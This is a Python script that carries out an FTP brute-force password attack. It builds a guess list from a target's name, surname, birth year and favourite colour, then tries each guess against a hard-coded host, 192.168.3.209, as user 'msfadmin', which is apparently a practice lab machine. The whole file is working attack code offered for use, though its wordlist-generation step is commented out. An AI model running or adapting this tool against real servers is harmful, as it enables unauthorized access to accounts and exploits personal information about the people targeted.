import argparse, itertools
from ftplib import FTP

def extract_distinct_characters(name, surname, born_year, color):
    strings=[name, surname, born_year, color]
    distinct_chars = set()
    combined_string = ''.join(strings)
    new_string = ''
    
    for char in combined_string:
        if char not in distinct_chars:
            distinct_chars.add(char)
            new_string += char
    
    return new_string

def generate_wordlist(characters, min_length, max_length, output_file):
   # Open the output file in write mode
   with open(output_file, 'w') as file:
       # Iterate over the range of word lengths from min_length to max_length.
       for length in range(min_length, max_length + 1):
           # Generate all possible combinations of characters with the given length.
           for combination in itertools.product(characters, repeat=length):
               # Join the characters to form a word and write it to the file.
               word = ''.join(combination)
               file.write(word + '\n')


def ftp_connection(hostname, username, password):
    try:
        # Connect to the FTP server
        ftp = FTP(hostname)
        # Login with the provided credentials
        ftp.login(username, password)
        # Close the FTP connection
        ftp.quit()     
        # If no exception occurred, the credentials are valid
        return True
    except Exception as e:
        # Print the error message if the login failed
        #print(f"Login failed: {str(e)}")
        return False

def FTP_brute_force(hostname, username,wordlist):
    for password in wordlist:
        if ftp_connection(hostname, username, password):
            print(username,' ',password,' Successfull \n')
            print('FTP BRUTE FORCE ATTACK is successfull')
            break
        else:
            print(username,' ',password,' Fail \n')


if __name__ == "__main__":
    
    name=input("Enter the name: ")
    surname=input("Enter the surname: ")
    born_year=input("Enter the year of birth: ")
    color=input("Enter the favorite color: ")

    min_length=int(input("Enter wordlist min Length: "))
    max_length=int(input("Enter wordlist min Length: "))
    output_file=input("Enter the wordlist name and extension(.txt): ")
    
    print('-------------------- Phase 1: WORDLIST GENERATION -------------------- \n')
    print('Generating the file :',output_file)
    #characters=extract_distinct_characters(name, surname, born_year, color)
    #generate_wordlist(characters,8,8,output_file)
    print('-------------------- Phase 2: FTP BRUTE FORCE ATTACK -------------------- \n')
    with open(output_file, 'r') as file:
        wordlist = file.read().splitlines()
    FTP_brute_force('192.168.3.209', 'msfadmin', wordlist)
    







